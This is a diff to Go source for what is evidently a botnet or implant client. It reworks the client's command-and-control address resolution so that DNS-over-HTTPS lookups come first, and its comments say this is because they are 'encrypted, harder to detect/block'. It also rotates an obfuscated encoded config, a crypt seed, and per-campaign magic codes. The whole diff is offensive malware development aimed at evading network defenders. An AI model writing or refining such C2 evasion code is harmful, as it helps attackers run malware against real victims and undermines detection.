@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "SCs5ugBTD6tTFTbx6iMdMI4D2nXE6Q==" //change me run setup.py
-const cryptSeed = "68ff64e5"                        //change me run setup.py
+const gothTits = "egfA1P8CCv/fNjx8NcqZDclcUyvf7ZWp4t0f6Y/g=" //change me run setup.py
+const cryptSeed = "da2283ee"                                //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -180,7 +180,7 @@ func deoxys(format string, args ...interface{}) {
 // ============================================================================
 // DNS RESOLUTION FUNCTIONS
 // These functions implement multi-method C2 address resolution for resilience.
-// Resolution order: TXT record -> DoH TXT -> A record -> Direct IP
+// Resolution order: DoH TXT -> TXT record -> A record -> Direct IP
 // ============================================================================
 
 // darkrai performs DNS TXT record lookup to retrieve C2 address.
@@ -431,8 +431,8 @@ func arceus(h string) bool {
 // dialga is the main C2 address resolver that orchestrates all resolution methods.
 // Resolution priority:
 //  1. Check if config is already IP:PORT format (direct connection)
-//  2. DNS TXT record lookup via UDP (darkrai)
-//  3. DNS TXT record lookup via DoH (palkia)
+//  2. DNS TXT record lookup via DoH (palkia) - encrypted, harder to detect
+//  3. DNS TXT record lookup via UDP (darkrai) - fallback if DoH blocked
 //  4. DNS A record fallback (rayquaza)
 //  5. Return raw decoded value as last resort
 //
@@ -465,17 +465,17 @@ func dialga() string {
 	}
 	deoxys("dialga: Domain=%s, Port=%s", domain, defaultPort)
 
-	// Method 1: DNS TXT record lookup
-	deoxys("dialga: Trying TXT record lookup via UDP DNS")
-	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
-		deoxys("dialga: TXT lookup success: %s", c2Addr)
-		return c2Addr
-	}
-
-	// Method 2: DoH TXT record lookup
+	// Method 1: DoH TXT record lookup (encrypted, harder to detect/block)
 	deoxys("dialga: Trying TXT record lookup via DoH")
 	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
 		deoxys("dialga: DoH TXT lookup success: %s", c2Addr)
+		return c2Addr
+	}
+
+	// Method 2: DNS TXT record lookup (fallback if DoH blocked)
+	deoxys("dialga: Trying TXT record lookup via UDP DNS")
+	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
+		deoxys("dialga: TXT lookup success: %s", c2Addr)
 		return c2Addr
 	}
 
@@ -493,8 +493,8 @@ func dialga() string {
 }
 
 const (
-	magicCode       = "oDU92ei#0OZqRueu" //change this per campaign
-	protocolVersion = "proto55"          //change this per campaign
+	magicCode       = "IhxWZGJDzdSviX$s" //change this per campaign
+	protocolVersion = "r5.6-stable"             //change this per campaign
 )
 
 var (
